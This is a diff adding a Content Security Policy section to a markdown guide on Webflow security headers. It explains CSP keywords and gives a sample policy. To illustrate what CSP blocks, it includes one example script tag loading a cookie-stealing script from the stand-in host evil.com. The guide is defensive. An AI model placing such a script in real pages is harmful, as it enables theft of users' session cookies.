@@ -5,6 +5,7 @@
 + [X-Frame-Options](#x-frame-options)
 + [Cross-Origin-Resource-Policy](#cross-origin-resource-policy)
 + [Strict-Transport-Security](#strict-transport-security)
++ [Content Security Policy](#content-security-policy)
 
 ## Set Security Headers in Webflow
 Developers do not have direct access to server configurations (e.g. `Apache`, `Nginx` or `.htaccess`), so the in-built `Webflow` security headings should be used. This is supported directly in `site settings`:
@@ -100,3 +101,34 @@ Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 This means: `"For the next 2 years, NEVER use HTTP for this site."`. Future visits to: `http://example.com` automatically become: `https://example.com` before any network request happens (an attacker can't intercept). The `max-age` value is the time in seconds the rule stays active. This example is: `63072000 = 2 years`. The browser forces `HTTPS` for 2 years. By including `includeSubDomains` this also applies to any subdomains e.g. `page.example.com`. With `preload`, this asks browsers to hardcode your domain into their built-in `HTTPS list` meaning even the very first visit is `HTTPS` and no initial `HTTP` request ever happens. Major browsers ship with this baked in.
 
 Security standards like the `OWASP Foundation` recommend enabling `HSTS` for all production sites. It’s one of the `highest-value security headers` to use.
+
+## Content Security Policy
+Think of `Content Security Policy (CSP)` as a firewall for the browser. Instead of trusting every `script`, `image`, or `iframe` a page tries to load, `CSP` tells the browser: "Only load resources from these exact places — block everything else.". It's one of the strongest defenses against `XSS` and `supply-chain` attacks.
+
+If the CSP policy says:
+
+```
+script-src 'self'
+```
+
+A script like this is unable to run and the browser will block it immediately:
+
+```html
+<script src="https://evil.com/steal-cookies.js"></script>
+```
+
+Core keywords:
+
++ `'self'` - Your own domain only
++ `'none'` - Block completely
++ `'unsafe-inline'` - Allow inline <script> or style="" (sometimes required)
++ `'unsafe-eval'` - Allow eval() but avoid if necessary
++ `https://domain.com` - Allow specific external source. The preferred method
+
+An example `CSP` may look like this:
+
+```
+default-src 'self'; script-src 'report-sample' 'self' https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js https://cdn-4.convertexperiments.com/v1/js/1004740-100417102.js https://cdn.jsdelivr.net/npm/@finsweet/attributes-autovideo@1/autovideo.js https://consent.cookiebot.com/uc.js https://player.vimeo.com/api/player.js https://use.typekit.net/zff2ofj.js https://www.googletagmanager.com/gtm.js; style-src 'report-sample' 'self' https://cdn.jsdelivr.net https://cdn.prod.website-files.com https://fonts.googleapis.com; object-src 'none'; base-uri 'self'; connect-src 'self' https://cdn-4.convertexperiments.com https://consentcdn.cookiebot.com https://eu01.rec.mouseflow.com https://px.ads.linkedin.com https://region1.analytics.google.com https://tags.srv.stackadapt.com https://trc-events.taboola.com https://ws.zoominfo.com; font-src 'self' data: https://cdn.prod.website-files.com https://fonts.gstatic.com https://use.typekit.net; frame-src 'self' https://www.googletagmanager.com; img-src 'self' https://alb.reddit.com https://cdn.prod.website-files.com https://px.ads.linkedin.com; manifest-src 'self'; media-src 'self'; report-uri https://698f2163e3e2c4cc2a5648c3.endpoint.csper.io?builder=true&v=2; worker-src 'none';
+```
+
+A browser extension for `Chrome` and `Firefox` can be used the generate the CSP [here](https://csper.io/generator).
